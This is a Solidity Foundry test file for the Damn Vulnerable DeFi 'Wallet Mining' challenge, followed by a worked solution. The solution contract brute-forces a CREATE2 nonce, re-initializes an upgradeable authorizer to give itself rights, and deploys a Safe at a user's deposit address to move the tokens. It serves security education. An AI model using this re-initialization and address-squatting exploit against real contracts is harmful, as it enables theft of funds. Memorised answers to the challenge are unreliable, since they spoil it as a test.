// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";

import {ERC20} from "solmate/tokens/ERC20.sol";

contract Executor {
    WalletDeployer walletDeployer;
    AuthorizerUpgradeable authorizer;
    DamnValuableToken token;
    address singletonCopy;
    address proxyFactory;
    address user;
    address userSafe;
    address ward;

    constructor(
        WalletDeployer _walletDeployer,
        AuthorizerUpgradeable _authorizer,
        DamnValuableToken _token,
        address _singletonCopy,
        address _proxyFactory,
        address _user,
        address _userSafe,
        address _ward
    ) {
        walletDeployer = _walletDeployer;
        authorizer = _authorizer;
        token = _token;
        singletonCopy = _singletonCopy;
        proxyFactory = _proxyFactory;
        user = _user;
        userSafe = _userSafe;
        ward = _ward;
    }

    function execute() external {
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (owners, 1, address(0), "", address(0), address(0), 0, payable(0))
        );

        bytes32 bytecodeHash = keccak256(
            abi.encodePacked(
                type(SafeProxy).creationCode,
                uint256(uint160(address(singletonCopy)))
            )
        );

        uint256 nonce = 0;

        // 1. Find the nonce for the user's Safe contract
        while (true) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
            if (userSafe == Create2.computeAddress(salt, bytecodeHash, proxyFactory)) {
                break;
            }
            nonce++;
        }

        // 2. Use the init function, so we can authorize this contract to deploy at user safe address
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = userSafe;
        authorizer.init(wards, aims);

        // 3. Deploy a new Safe instance at user safe address
        walletDeployer.drop(userSafe, initializer, nonce);

        // 4. Send funds to ward's address
        token.transfer(ward, token.balanceOf(address(this)));
    }
}

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    struct SafeTxParams {
        address to;
        uint256 value;
        bytes data;
        Enum.Operation operation;
        uint256 safeTxGas;
        uint256 baseGas;
        uint256 gasPrice;
        address gasToken;
        address payable refundReceiver;
        uint256 nonce;
        bytes signatures;
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        _deploySafeInstance();
        _sendFundsToUser();
    }

    function _deploySafeInstance() internal {
        Executor executor = new Executor(
            walletDeployer,
            authorizer,
            token,
            address(singletonCopy),
            address(proxyFactory),
            user,
            USER_DEPOSIT_ADDRESS,
            ward
        );
        executor.execute();

        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));

        assertEq(safe.getOwners().length, 1);
        assertEq(safe.getOwners()[0], user);
        assertEq(token.balanceOf(address(safe)), DEPOSIT_TOKEN_AMOUNT);
    }

    function _sendFundsToUser() internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));

        SafeTxParams memory params;
        params.to = address(token);
        params.value = 0;
        params.data = abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
        params.operation = Enum.Operation.Call;
        params.safeTxGas = 0;
        params.baseGas = 0;
        params.gasPrice = 0;
        params.gasToken = address(0);
        params.refundReceiver = payable(0);
        params.nonce = safe.nonce();

        bytes32 txHash = safe.getTransactionHash(
            params.to,
            params.value,
            params.data,
            params.operation,
            params.safeTxGas,
            params.baseGas,
            params.gasPrice,
            params.gasToken,
            params.refundReceiver,
            params.nonce
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);

        safe.execTransaction(
            params.to,
            params.value,
            params.data,
            params.operation,
            params.safeTxGas,
            params.baseGas,
            params.gasPrice,
            params.gasToken,
            params.refundReceiver,
            abi.encodePacked(r, s, v)
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}
